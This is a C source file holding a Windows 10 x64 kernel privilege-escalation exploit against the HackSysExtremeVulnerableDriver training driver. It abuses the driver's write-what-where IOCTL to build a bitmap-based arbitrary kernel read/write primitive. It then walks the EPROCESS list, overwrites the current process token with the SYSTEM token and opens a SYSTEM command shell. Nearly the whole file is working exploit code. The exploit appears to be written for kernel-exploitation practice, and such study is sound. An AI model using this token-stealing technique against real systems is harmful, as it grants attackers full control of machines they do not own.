#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>
#include<profileapi.h>
#include "struct.h"

HANDLE hDevice = NULL;
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;

/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*                     Write-What-Where                                 */
/*				    Windows 10 x64 1511-1607							*/
/************************************************************************/

BOOL init()
{
	printf("[+]Start to get HANDLE");
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf(" => done!\n");
	return TRUE;
}

LeakBitmapInfo GetBitmap()
{
	UINT loadCount = 0;
	HACCEL hAccel = NULL;
	LPACCEL lPaccel = NULL;
	PUSER_HANDLE_ENTRY firstEntryAddr = NULL;
	PUSER_HANDLE_ENTRY secondEntryAddr = NULL;
	int nSize = 700;
	int handleIndex = 0;

	PUCHAR firstAccelKernelAddr;
	PUCHAR secondAccelKernelAddr;

	PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(L"user32.dll"), "gSharedInfo");	// 获取gSharedInfo表
	PUSER_HANDLE_ENTRY gHandleTable = pfindSharedInfo->aheList;
	LeakBitmapInfo retBitmap;

	lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * nSize);

	while (loadCount < 20)
	{
		hAccel = CreateAcceleratorTable(lPaccel, nSize);	

		handleIndex = LOWORD(hAccel);

		firstEntryAddr = &gHandleTable[handleIndex];

		firstAccelKernelAddr = (PUCHAR)firstEntryAddr->pKernel;
		DestroyAcceleratorTable(hAccel);

		hAccel = CreateAcceleratorTable(lPaccel, nSize);	

		handleIndex = LOWORD(hAccel);

		secondEntryAddr = &gHandleTable[handleIndex];

		secondAccelKernelAddr = (PUCHAR)firstEntryAddr->pKernel;

		if (firstAccelKernelAddr == secondAccelKernelAddr)
		{
			DestroyAcceleratorTable(hAccel);
			LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			retBitmap.hBitmap = CreateBitmap(0x701, 2, 1, 8, lpBuf); //SetBitmapBits(retBitmap.hBitmap, 5, "AAAA");
			break;
		}
		DestroyAcceleratorTable(hAccel);
		loadCount++;
	}

	retBitmap.pBitmapPvScan0 = firstAccelKernelAddr + 0x50;


	printf("[+]bitmap handle is:  0x%08x \n", (ULONG)retBitmap.hBitmap);
	printf("[+]bitmap pvScan0 at: 0x%p \n\n", retBitmap.pBitmapPvScan0);

	return retBitmap;
}

VOID Trigger_shellcode(UINT64 where, UINT64 what)
{

	WRITE_WHAT_WHERE exploitlow;
	WRITE_WHAT_WHERE exploithigh;
	DWORD lpbReturn = 0;

	UINT32 lowValue = what;
	UINT32 highvalue = (what >> 0x20);

	exploitlow.What = (PULONG_PTR)& what;
	exploitlow.Where = (PULONG_PTR)where;

	printf("[+]Start to trigger ");

	DeviceIoControl(hDevice,
		0x22200B,
		&exploitlow,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	exploithigh.What = (PULONG_PTR)& highvalue;
	exploithigh.Where = (PULONG_PTR)(where + 0x4);

	DeviceIoControl(hDevice,
		0x22200B,
		&exploithigh,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	printf("=> done!\n");
}

LeakBitmapInfo managerBitmap;
LeakBitmapInfo workerBitmap;

VOID SMEP_bypass_ready()
{
	managerBitmap = GetBitmap();
	workerBitmap = GetBitmap();
	DWORD64 managerPvScanAddress = (DWORD64)managerBitmap.pBitmapPvScan0;
	DWORD64 workerPvScanAddress = (DWORD64)workerBitmap.pBitmapPvScan0;
	Trigger_shellcode((DWORD64)managerPvScanAddress, (DWORD64)workerPvScanAddress);
}

VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	SetBitmapBits(managerBitmap.hBitmap, len, &whereRead);
	GetBitmapBits(workerBitmap.hBitmap, len, whatValue);	// read
}

VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(managerBitmap.hBitmap, len, &whereWrite);
	SetBitmapBits(workerBitmap.hBitmap, len, &whatValue);	// write
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

DWORD64 stealToken()
{
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL)
	{
		printf("[+]Failed to get NtQuerySystemInformation\n");
		return NULL;
	}

	DWORD len;

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!moduleInfo)
	{
		printf("[+]Failed to get moduleInfo\n");
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);

	LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
	LPVOID kernelImage = moduleInfo->Module[0].FullPathName;
	printf("[+]kernel base address is at: 0x%p\n", kernelBase);

	LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
	printf("[+]kernel name is: %s\n", lpkernelName);

	HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);

	if (hUserSpacekernel == NULL)
	{
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");

	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpacekernel);
	VirtualFree(moduleInfo, 0, MEM_RELEASE);

	LPVOID lpSystemEPROCESS = NULL;
	LPVOID lpSysProcID = NULL;
	LPVOID lpSystemToken = NULL;
	LIST_ENTRY lpNextEntryAddreess;
	readOOB((DWORD64)pLiveFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2e8), &lpSysProcID, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x358), &lpSystemToken, sizeof(LPVOID));
	readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));

	printf("[+]system process address is: 0x%p\n", lpSystemEPROCESS);
	printf("[+]Next Process AT: 0x%p\n", lpNextEntryAddreess.Flink);
	printf("[+]system process token value is: 0x%p\n", lpSystemToken);
	printf("[+]system process PID is: 0x%p\n", lpSysProcID);

	DWORD64 currentProcessID = GetCurrentProcessId();

	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	do
	{
		lpNextEPROCESS = (PUCHAR)lpNextEntryAddreess.Flink - 0x2f0;
		readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e8), &lpCurrentPID, sizeof(LPVOID));
		dwCurrentPID = LOWORD(lpCurrentPID);
		readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != currentProcessID);

	DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;
	printf("[+]Start to write token");
	writeOOB(currentTokenAddress, lpSystemToken, sizeof(LPVOID));
	printf(" => done!\n");
}

/*
*[+]Learn from wjllz : https://github.com/redogwu/windows_kernel_exploit
*[+]Hope can help you :)
*/

int main()
{
	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return -1;
	}
	//__debugbreak();
	SMEP_bypass_ready();

	stealToken();

	CreateCmd();
	system("pause");
	return 0;
}